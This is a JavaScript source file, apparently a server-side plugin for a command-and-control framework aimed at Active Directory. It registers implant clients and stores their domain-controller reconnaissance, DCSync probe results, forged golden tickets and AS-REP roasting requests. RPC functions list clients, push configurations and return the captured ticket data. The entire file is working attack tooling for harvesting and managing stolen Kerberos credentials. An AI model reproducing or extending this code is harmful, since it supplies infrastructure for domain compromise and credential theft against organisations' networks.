function norm(payload) {
  if (payload == null) return {};
  if (typeof payload === "string") {
    try { return JSON.parse(payload); } catch { return { raw: payload }; }
  }
  if (payload instanceof Uint8Array || payload instanceof ArrayBuffer) {
    const s = new TextDecoder().decode(payload);
    try { return JSON.parse(s); } catch { return { raw: s }; }
  }
  return payload;
}

export default {
  setup(ctx) {
    ctx.clients = new Map();

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS probes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        domain TEXT,
        dc TEXT,
        rpc_ports TEXT,
        drsuapi INTEGER DEFAULT 0,
        bind TEXT,
        reason TEXT,
        seen_at INTEGER NOT NULL
      )`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS recon (
        client_id TEXT PRIMARY KEY,
        domain TEXT,
        dcs TEXT,
        dc TEXT,
        rpc TEXT,
        seen_at INTEGER NOT NULL
      )`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS tickets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        kind TEXT NOT NULL,
        user TEXT,
        domain TEXT,
        etype INTEGER,
        sid TEXT,
        size INTEGER,
        data TEXT,
        captured_at INTEGER NOT NULL
      )`);
    ctx.db.run(`CREATE INDEX IF NOT EXISTS tickets_client ON tickets(client_id)`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS krb_req (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        kind TEXT,
        user TEXT,
        domain TEXT,
        dc TEXT,
        data TEXT,
        size INTEGER,
        seen_at INTEGER NOT NULL
      )`);

    ctx.db.run(`CREATE TABLE IF NOT EXISTS config (client_id TEXT PRIMARY KEY, config TEXT NOT NULL)`);
  },

  onEvent(ctx, clientId, event, payload) {
    if (!clientId) return;
    ctx.clients.set(clientId, Date.now());
    const p = norm(payload);
    const now = Date.now();

    if (event === "status") {
      ctx.broadcast("status", { clientId, ...p });
    } else if (event === "recon") {
      ctx.db.run(
        `INSERT INTO recon (client_id, domain, dcs, dc, rpc, seen_at) VALUES (?, ?, ?, ?, ?, ?)
         ON CONFLICT(client_id) DO UPDATE SET
           domain = excluded.domain, dcs = excluded.dcs, dc = excluded.dc,
           rpc = excluded.rpc, seen_at = excluded.seen_at`,
        clientId, p.domain || null, JSON.stringify(p.dcs || []),
        p.dc || null, JSON.stringify(p.rpc || []), now
      );
      ctx.broadcast("recon", { clientId, ...p });
    } else if (event === "dcsync_probe") {
      ctx.db.run(
        `INSERT INTO probes (client_id, domain, dc, rpc_ports, drsuapi, bind, reason, seen_at)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        clientId, null, p.dc || null, JSON.stringify(p.rpcPorts || []),
        p.drsuapi ? 1 : 0, p.bind || null, p.reason || null, now
      );
      ctx.broadcast("dcsync_probe", { clientId, ...p });
    } else if (event === "golden_ticket") {
      ctx.db.run(
        `INSERT INTO tickets (client_id, kind, user, domain, etype, sid, size, data, captured_at)
         VALUES (?, 'golden', ?, ?, ?, ?, ?, ?, ?)`,
        clientId, p.user || null, p.domain || null, p.etype || 0,
        p.sid || null, p.size || 0, p.kirbi || null, now
      );
      ctx.broadcast("golden_ticket", {
        clientId, user: p.user, domain: p.domain, etype: p.etype, size: p.size,
      });
    } else if (event === "asrep_request") {
      ctx.db.run(
        `INSERT INTO krb_req (client_id, kind, user, domain, dc, data, size, seen_at)
         VALUES (?, 'asrep', ?, ?, ?, ?, ?, ?)`,
        clientId, p.user || null, p.domain || null, p.dc || null, p.requestB64 || null, p.size || 0, now
      );
      ctx.broadcast("asrep_request", { clientId, user: p.user, size: p.size });
    } else if (event === "krb_recon") {
      ctx.broadcast("krb_recon", { clientId, ...p });
    } else if (event === "error") {
      ctx.broadcast("error", { clientId, ...p });
    } else if (event === "pong") {
      ctx.broadcast("pong", { clientId, ...p });
    }
  },

  rpc: {
    list_clients(ctx) {
      return Array.from(ctx.clients.entries()).map(([clientId, lastSeen]) => ({ clientId, lastSeen }));
    },

    get_config(ctx, params = {}) {
      const row = ctx.db.query(`SELECT config FROM config WHERE client_id = ?`).get(params.clientId || "");
      return row ? JSON.parse(row.config) : {};
    },

    save_config(ctx, params = {}) {
      ctx.db.run(
        `INSERT INTO config (client_id, config) VALUES (?, ?)
         ON CONFLICT(client_id) DO UPDATE SET config = excluded.config`,
        params.clientId, JSON.stringify(params.config || {})
      );
      return { ok: true };
    },

    get_recon(ctx, params = {}) {
      const row = ctx.db
        .query(`SELECT domain, dcs, dc, rpc, seen_at AS at FROM recon WHERE client_id = ?`)
        .get(params.clientId || "");
      if (!row) return null;
      return { ...row, dcs: JSON.parse(row.dcs || "[]"), rpc: JSON.parse(row.rpc || "[]") };
    },

    list_probes(ctx, params = {}) {
      return ctx.db
        .query(`SELECT dc, rpc_ports AS rpcPorts, drsuapi, bind, reason, seen_at AS at
                FROM probes WHERE client_id = ? ORDER BY id DESC LIMIT 50`)
        .all(params.clientId || "")
        .map((r) => ({ ...r, drsuapi: !!r.drsuapi, rpcPorts: JSON.parse(r.rpcPorts || "[]") }));
    },

    list_tickets(ctx, params = {}) {
      return ctx.db
        .query(`SELECT id, kind, user, domain, etype, sid, size, captured_at AS at
                FROM tickets WHERE client_id = ? ORDER BY id DESC LIMIT 100`)
        .all(params.clientId || "");
    },

    get_ticket(ctx, params = {}) {
      const row = ctx.db.query(`SELECT kind, user, data FROM tickets WHERE id = ?`).get(params.id);
      if (!row) throw new Error("ticket not found");
      return row;
    },

    list_requests(ctx, params = {}) {
      return ctx.db
        .query(`SELECT id, kind, user, domain, size, seen_at AS at FROM krb_req
                WHERE client_id = ? ORDER BY id DESC LIMIT 100`)
        .all(params.clientId || "");
    },

    get_request(ctx, params = {}) {
      const row = ctx.db.query(`SELECT user, data FROM krb_req WHERE id = ?`).get(params.id);
      if (!row) throw new Error("request not found");
      return row;
    },
  },
};
